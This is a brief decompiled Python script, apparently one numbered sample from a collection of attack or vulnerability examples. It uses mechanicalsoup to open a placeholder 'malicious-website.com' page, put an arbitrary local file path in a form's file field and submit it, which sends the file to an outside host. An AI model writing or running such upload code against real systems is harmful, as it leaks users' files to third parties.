# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 215_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 319 bytes
import mechanicalsoup
browser = mechanicalsoup.StatefulBrowser()
browser.open("https://malicious-website.com")
browser.select_form("form")
browser.form.set("file", "/path/to/arbitrary/file")
browser.submit_selected()

# okay decompiling 215_1.pyc
